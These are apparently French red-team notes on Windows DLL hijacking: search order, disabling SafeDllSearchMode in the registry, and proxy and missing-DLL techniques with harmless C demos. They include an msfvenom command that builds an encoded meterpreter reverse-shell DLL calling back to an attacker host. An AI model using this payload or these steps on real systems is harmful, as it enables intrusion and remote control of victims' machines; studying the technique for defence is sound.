
Lorsqu'il tente de localiser une DLL, Windows utilise l'ordre de recherche suivant par défaut (**Safe DLL Search Mode**).

1. Le répertoire à partir duquel l'application a été chargée.
2. Le répertoire système `C:\Windows\System32` pour les systèmes 64 bits.
3. Le répertoire système 16 bits `C:\Windows\System` (non supporté sur les systèmes 64 bits)
4. Le répertoire Windows.
5. Le répertoire courant.
6. Tous les répertoires répertoriés dans la variable d'environnement PATH.

Si le **Safe DLL Search Mode** est désactivé, alors l'ordre devient le suivant.

1. Le répertoire à partir duquel l'application est chargée.
2. **Le répertoire courant.**
3. Le répertoire système.
4. Le répertoire système 16 bits.
5. Le répertoire Windows
6. Les répertoires listés dans la variable d'environnement PATH.


# Désactiver le Safe DLL Search Mode

1. Appuyez sur `Touche Windows + R` pour ouvrir la boîte de dialogue Exécuter.
2. Tapez `Regedit` et appuyez sur `Entrée`. Cela ouvrira l'Éditeur du Registre.
3. Naviguez jusqu'à `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager`.
4. Dans le panneau de droite, recherchez la valeur `SafeDllSearchMode`. Si elle n'existe pas, cliquez avec le bouton droit de la souris sur l'espace vide du dossier ou cliquez avec le bouton droit de la souris sur le dossier `Session Manager`, sélectionnez `New` (Nouveau) et ensuite `DWORD (32-bit) Value` (Valeur DWORD (32-bit)). Nommez cette nouvelle valeur `SafeDllSearchMode`.
5. Double-cliquez sur `SafeDllSearchMode`. Dans le champ de données Value, entrez `1` pour activer et `0` pour désactiver Safe DLL Search Mode.
6. Cliquez sur « OK », fermez l'Editeur de Registre et redémarrez le système pour que les changements prennent effet.


# Tools pour identifier les DLL chargées par un programme :

1. Process Explorer : Cet outil, qui fait partie de la suite Sysinternals de Microsoft, fournit des informations détaillées sur les processus en cours d'exécution, y compris les DLL chargées. En sélectionnant un processus et en inspectant ses propriétés, vous pouvez visualiser ses DLL.
2. PE Explorer : Cet explorateur d'exécutable portable (PE) permet d'ouvrir et d'examiner un fichier PE (tel qu'un .exe ou un .dll). Il révèle notamment les DLL à partir desquelles le fichier importe des fonctionnalités.
3. Procmon -> Filter -> Operation is Load Image
4. VirusTotal : Dans les modules chargés



# Créer une DLL malveillante avec MSFVENOM

Staged Windows x64 meterpreter reverse #DLL

```BASH
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -e x86/shikata_ga_nai -i 10 -f dll > charge.dll
```

# Déterminer les fonctions à modifier dans la DLL

1. Ouvrir le programme dans Ghidra et identifier les fonctions importés par la DLL

## Proxying (Hijack)

Nous pouvons utiliser une méthode connue sous le nom de DLL Proxying pour exécuter un Hijack. Nous allons créer une nouvelle bibliothèque qui chargera la fonction à partir de la dll, la modifiera et la renverra au programme.

1. Créer une nouvelle DLL : Nous allons créer une nouvelle DLL qui servira de proxy pour la dll. Cette bibliothèque contiendra le code nécessaire pour charger la fonction  de la dll et effectuer l'altération requise.
2. Chargement de la fonction : Dans la nouvelle DLL, nous chargerons la fonction à partir du fichier DLL d'origine. Cela nous permettra d'accéder à la fonction d'origine.
3. Falsifier la fonction : Une fois la fonction chargée, nous pouvons appliquer les altérations ou modifications souhaitées à son résultat.
4. Retourner la fonction modifiée : Après avoir terminé le processus d'altération, nous renverrons la fonction modifiée de la nouvelle bibliothèque au programme. Ainsi, lorsque le programme appellera la fonction, il exécutera la version modifiée avec les changements prévus.

Exemple avec fonction Add de la DLL library.dll -> Création de tamper.dll

```c
// tamper.c
#include <stdio.h>
#include <Windows.h>

#ifdef _WIN32
#define DLL_EXPORT __declspec(dllexport)
#else
#define DLL_EXPORT
#endif

typedef int (*AddFunc)(int, int);

DLL_EXPORT int Add(int a, int b)
{
    // Load the original library containing the Add function
    HMODULE originalLibrary = LoadLibraryA("library.o.dll");
    if (originalLibrary != NULL)
    {
        // Get the address of the original Add function from the library
        AddFunc originalAdd = (AddFunc)GetProcAddress(originalLibrary, "Add");
        if (originalAdd != NULL)
        {
            printf("============ HIJACKED ============\n");
            // Call the original Add function with the provided arguments
            int result = originalAdd(a, b);
            // Tamper with the result by adding +1
            printf("= Adding 1 to the sum to be evil\n");
            result += 1;
            printf("============ RETURN ============\n");
            // Return the tampered result
            return result;
        }
    }
    // Return -1 if the original library or function cannot be loaded
    return -1;
}
```

Compiler la lib et renommer la lib hijackée en library.o.dll, puis renommer tamper.dll en library.dll


# Invalid DLL

Identifier les DLL non trouvées

Dans procmon -> Filter -> Result is NAME NOT FOUND -> Path ends with .dll 

Créer point d'entrée DLL Main qui est automatiquement appelé par Windows lors du chargement de la DLL.

```c
#include <stdio.h>
#include <Windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    {
        printf("Hijacked... Oops...\n");
    }
    break;
    case DLL_PROCESS_DETACH:
        break;
    case DLL_THREAD_ATTACH:
        break;
    case DLL_THREAD_DETACH:
        break;
    }
    return TRUE;
}
```

Compiler et renommer la dll


Si besoin d'intégrer les fonctions de la DLL d'origine
### Automatisation avec DLLLirant

https://github.com/redteamsocietegenerale/DLLirant

